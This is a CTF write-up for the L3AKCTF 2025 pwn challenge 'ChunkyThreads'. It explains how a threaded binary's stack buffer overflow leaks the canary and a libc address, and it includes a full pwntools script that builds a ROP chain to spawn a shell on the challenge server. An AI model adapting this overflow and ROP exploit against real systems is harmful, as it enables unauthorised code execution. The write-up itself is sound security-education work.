+++
author = "Velobobo"
title = "L3AKCTF 2025 - ChunkyThreads"
date = "2025-07-12"
description = ""
draft = false
slug = "l3ak-2025-chunkythreads"
ctfs = ["L3AKCTF-2025"]
tags = [
    "threads",
    "ctf",
]
categories = [
    "pwn"
]

+++

# ChunkyThreads – l3akCTF 2025

## Overview  
This binary has no pie but all other protections. it uses different threads to print out data , first we have to set the max number of threads by `CHUNKS <num>` threads can be upto 10. then we can enter a cmd like `CHUNK <sleep_time> <repeat> <data>` which uses a thread to print out data and then wait for sleep_time and print again till the data is printed `<repeat>` times. The data is stored in a buffer on stack and can be of any length.


## Reversed code
main
 {{< figure src="main.png" alt="main" width="500" >}}
parsecmd
 {{< figure src="parsecmd.png" alt="parsecmd" width="500" >}}
print
 {{< figure src="print.png" alt="print" width="500" >}}



## Exploitation Plan  
As the binary first puts and then goes to sleep , we can use a thread to leak stack canary by overwriting till the canary's null byte and then puts will leak it and we also provide a big sleep value so that the thread doesn't execute stach_chk_fail.
```python
payload=b'CHUNK 100 1 ' +b'A'*0x49
p.send(payload)
p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
canary=b'\x00'+p.recv(7)
canary=u64(canary.ljust(8,b'\x00'))
log.critical(f'Canary : {hex(canary)}')
```

Then we use other thread to rop , but the binary had no `pop rdi` gadget , so we had to rop from libc but for that we had to get libcbase. I was stuck here but then i just examined in gdb where the `print` function was returning to , i thought it would return in the binary but it was returning to a libc address. I didn't try to find the reason but maybe cuz threads came into play??? So then i leaked this like the same way i leaked the canary and then calculated the offset of this leaked libc address from the libcbase and hardcoded this offset as it will not change. At last we just call `system(/bin/sh)` and put the sleep time less as we want this to exit before the other 2 threads execute stack_chk_fails

Later found out that thread was started by `pthread_create` which is a libc function so the thread was returning inside this function after termination. thats why i saw print return to a libc address and not a binary address.

## Full exploit script  

```python
from pwn import *

binary='./chall_patched'
elf = context.binary = ELF(binary, checksec=False)
#context.log_level='debug'
libc=ELF('./libc.so.6',checksec=False)
#p=process(binary)
#gdb.attach(p)
p=remote("34.45.81.67",16006)
p.clean()
p.send(b'CHUNKS 8 ') # setting max threads value
p.recvline()
p.clean()

payload=b'CHUNK 100 1 ' +b'A'*0x49
p.send(payload)
p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
canary=b'\x00'+p.recv(7)
canary=u64(canary.ljust(8,b'\x00'))
log.critical(f'Canary : {hex(canary)}')


payload=b'CHUNK 100 1 ' +b'A'*88
p.send(payload)
p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
libcaddr=p.recv(6)
libcbase=u64(libcaddr.ljust(8,b'\x00'))-0x9caa4
log.critical(f'Libcaddr : {hex(libcbase+0x9caa4)}')
log.critical(f'Libcbase : {hex(libcbase)}')

libc.address=libcbase
poprdi=libcbase+0x000000000010f75b
binsh=libcbase+0x1cb42f
system=libcbase+0x58750
log.critical(f'poprdi : {hex(poprdi)}')
log.critical(f'binsh : {hex(binsh)}')
log.critical(f'system : {hex(system)}')

p.clean()
payload=b'CHUNK 1 1 ' +b'A'*0x48 + p64(canary) +b'B'*8 + p64(poprdi) + p64(binsh) +p64(0x000000000040101a) +p64(system)
p.send(payload)

p.interactive()
```

## Result  
{{< figure src="flag.png" alt="flag" width="500" >}}

Also i had to type cmds two times for it to execute on the shell , thats cuz now my input is shared by both the main process(which has 2 threads running) and also my newly exceeded shell.
